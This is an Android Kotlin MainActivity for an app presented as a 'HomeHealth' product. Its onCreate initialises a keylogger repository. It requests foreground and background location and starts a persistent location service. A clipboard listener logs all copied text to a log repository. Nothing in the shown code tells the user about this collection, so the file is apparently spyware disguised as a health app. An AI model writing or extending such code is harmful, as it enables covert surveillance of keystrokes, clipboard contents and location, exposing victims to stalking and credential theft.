package com.example.homehealth

import android.Manifest
import android.content.Intent
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import androidx.navigation.compose.rememberNavController
import com.example.homehealth.data.repository.LogRepository
import com.example.homehealth.ui.theme.HomeHealthTheme
import com.example.homehealth.utils.ClipboardMonitor
import com.example.homehealth.utils.createNotificationChannels
import com.example.homehealth.location.LocationCollector
import com.example.homehealth.location.LocationService
import com.example.homehealth.keylogger.KeylogRepository
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val locationGranted = permissions[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                    permissions[Manifest.permission.ACCESS_COARSE_LOCATION] == true
            val notificationGranted = permissions[Manifest.permission.POST_NOTIFICATIONS] == true

            if (locationGranted) {
                Log.d("Permission", "Location permission granted")
                startLocationService()
                
                // After getting foreground location, we can ask for background location
                requestBackgroundLocationPermission()
            } else {
                Log.d("Permission", "Location permission denied")
            }

            if (notificationGranted) {
                Log.d("Permission", "Notification permission granted")
            }
        }

    private val backgroundLocationLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            if (granted) {
                Log.d("Permission", "Background location permission granted")
            } else {
                Log.d("Permission", "Background location permission denied")
            }
        }

    private var lastClipboardLogTime = 0L
    private var lastClipboardText = ""
    private val clipboardDebounceMs = 1000L // Debounce for 1 second

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Initialize keylogger repository
        KeylogRepository.getInstance().init(this)

        createNotificationChannels(this)
        checkAndRequestPermissions()

        // Use the centralized scheduler
        WorkScheduler.schedule(this)

        setContent {
            HomeHealthTheme {
                val navController = rememberNavController()
                NavGraph(navController)
            }
        }
    }

    private fun checkAndRequestPermissions() {
        val permissionsToRequest = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
            permissionsToRequest.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        if (permissionsToRequest.isNotEmpty()) {
            requestPermissionLauncher.launch(permissionsToRequest.toTypedArray())
        } else {
            // Permissions already granted
            startLocationService()
            requestBackgroundLocationPermission()
        }
    }

    private fun requestBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                // Background location must be requested separately and after foreground location
                backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }
    }

    private fun startLocationService() {
        val intent = Intent(this, LocationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissionLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
            }
        }
    }

    private val clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clipData = clipboard.primaryClip
        if (clipData != null && clipData.itemCount > 0) {
            val text = clipData.getItemAt(0).text?.toString() ?: ""
            Log.d("Clipboard", "Detected: $text")

            ClipboardMonitor.updateText(text)

            // Debounce: only log if text is different or enough time has passed
            val currentTime = System.currentTimeMillis()
            if (text.isNotBlank() && (text != lastClipboardText || currentTime - lastClipboardLogTime > clipboardDebounceMs)) {
                lastClipboardText = text
                lastClipboardLogTime = currentTime
                lifecycleScope.launch {
                    LogRepository.logClipboardText(this@MainActivity, text)
                }
            }
        }
    }

    // MERGED onResume function
    override fun onResume() {
        super.onResume()

        // 1. Notification logic
        requestNotificationPermission()

        // 2. Clipboard logic - Register listener when app comes to foreground
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        // Remove listener first to prevent duplicates if onResume is called multiple times
        clipboard.removePrimaryClipChangedListener(clipboardListener)
        clipboard.addPrimaryClipChangedListener(clipboardListener)
    }

    override fun onPause() {
        super.onPause()
        // Unregister to save resources when app is in background
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.removePrimaryClipChangedListener(clipboardListener)
    }
}
